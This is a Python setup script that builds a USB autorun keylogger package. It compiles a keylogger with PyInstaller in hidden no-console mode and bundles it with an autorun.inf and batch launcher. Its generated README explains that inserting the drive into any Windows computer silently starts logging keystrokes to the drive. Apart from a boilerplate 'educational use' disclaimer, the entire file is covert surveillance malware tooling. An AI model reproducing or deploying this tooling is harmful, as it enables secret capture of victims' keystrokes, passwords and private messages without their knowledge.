#!/usr/bin/env python3
"""
USB Keylogger Setup Script
Creates a complete USB autorun keylogger package
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path

def create_usb_package():
    """Create complete USB keylogger package"""
    print("=== USB Keylogger Setup ===")
    print("Creating USB autorun keylogger package...")
    
    # Create USB directory
    usb_dir = "USB_Keylogger"
    if os.path.exists(usb_dir):
        shutil.rmtree(usb_dir)
    os.makedirs(usb_dir)
    
    # Step 1: Create executable
    print("1. Creating executable...")
    if not create_executable():
        print("Failed to create executable!")
        return False
    
    # Step 2: Copy files to USB directory
    print("2. Copying files to USB package...")
    files_to_copy = [
        "keylogger.exe",
        "usb_autorun.bat", 
        "autorun.inf"
    ]
    
    for file in files_to_copy:
        if os.path.exists(file):
            shutil.copy2(file, usb_dir)
            print(f"   ✓ {file}")
        else:
            print(f"   ✗ {file} not found!")
            return False
    
    # Step 3: Create README
    print("3. Creating instructions...")
    create_readme(usb_dir)
    
    print("\n=== USB Keylogger Package Created! ===")
    print(f"Package location: {os.path.abspath(usb_dir)}")
    print("\nInstructions:")
    print("1. Copy all files from the USB_Keylogger folder to your USB drive root")
    print("2. Insert the USB drive into any Windows computer")
    print("3. The keylogger will start automatically")
    print("4. Logs will be saved as 'keylog_output.txt' on the USB drive")
    
    return True

def create_executable():
    """Create the keylogger executable"""
    try:
        # Install PyInstaller if needed
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                      capture_output=True, check=True)
        
        # Create executable
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole", 
            "--name=keylogger",
            "--hidden-import=pynput.keyboard._win32",
            "--hidden-import=pynput.mouse._win32",
            "keylloger.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            # Copy executable to current directory
            exe_path = os.path.join("dist", "keylogger.exe")
            if os.path.exists(exe_path):
                shutil.copy2(exe_path, "keylogger.exe")
                print("   ✓ Executable created successfully")
                return True
            else:
                print("   ✗ Executable not found in dist folder")
                return False
        else:
            print(f"   ✗ Error creating executable: {result.stderr}")
            return False
    except Exception as e:
        print(f"   ✗ Error: {e}")
        return False

def create_readme(usb_dir):
    """Create README file with instructions"""
    readme_content = """USB Keylogger - Instructions

This USB drive contains an autorun keylogger that will start automatically when inserted into a Windows computer.

FILES:
- keylogger.exe: The main keylogger executable
- usb_autorun.bat: Autorun launcher script  
- autorun.inf: Windows autorun configuration
- README.txt: This instruction file

HOW IT WORKS:
1. When USB is inserted, Windows reads autorun.inf
2. autorun.inf tells Windows to run usb_autorun.bat
3. usb_autorun.bat starts keylogger.exe silently
4. Keylogger runs in background and logs keystrokes
5. Logs are saved as 'keylog_output.txt' on the USB drive

IMPORTANT:
- Only works on Windows computers with autorun enabled
- Some antivirus software may block the execution
- Use responsibly and only on systems you own or have permission to test

DISCLAIMER:
This tool is for educational and authorized testing purposes only.
The user is responsible for complying with all applicable laws.
"""
    
    with open(os.path.join(usb_dir, "README.txt"), "w") as f:
        f.write(readme_content)

def main():
    print("USB Keylogger Setup Tool")
    print("========================")
    
    if len(sys.argv) > 1 and sys.argv[1] == "--create-package":
        create_usb_package()
    else:
        print("Usage: python setup_usb_keylogger.py --create-package")
        print("This will create a complete USB keylogger package.")

if __name__ == "__main__":
    main() 